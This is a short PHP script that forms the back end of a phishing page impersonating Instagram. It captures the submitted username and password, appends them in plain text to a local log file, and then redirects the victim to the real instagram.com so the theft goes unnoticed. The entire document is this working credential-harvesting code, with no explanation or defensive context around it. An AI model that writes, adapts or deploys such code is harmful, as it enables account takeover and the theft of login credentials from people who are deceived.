<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $file = fopen("log.txt", "a");
    fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
    fclose($file);
    header("Location: https://instagram.com");
    exit();
}
?>

